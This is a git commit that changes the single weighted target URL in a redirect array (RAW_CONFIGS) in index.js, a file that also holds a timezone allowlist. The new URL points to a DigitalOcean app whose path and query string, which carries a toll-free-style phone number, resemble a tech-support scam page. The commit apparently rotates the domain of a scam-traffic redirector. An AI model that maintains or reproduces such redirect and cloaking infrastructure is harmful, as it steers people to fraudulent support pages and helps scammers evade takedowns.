3b5b0a8a15afe2f744c682ac7e0e5eea1c21fecb
paalakash <palaksh452@gmail.com>
2026-06-11 07:23:22 +0530

    Update URL in RAW_CONFIGS array

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://shark-app-qzw39.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-4025", weight: 1.0 }
+    { url: "https://dolphin-app-2-wq7ld.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-4025", weight: 1.0 }
 
 ];
 
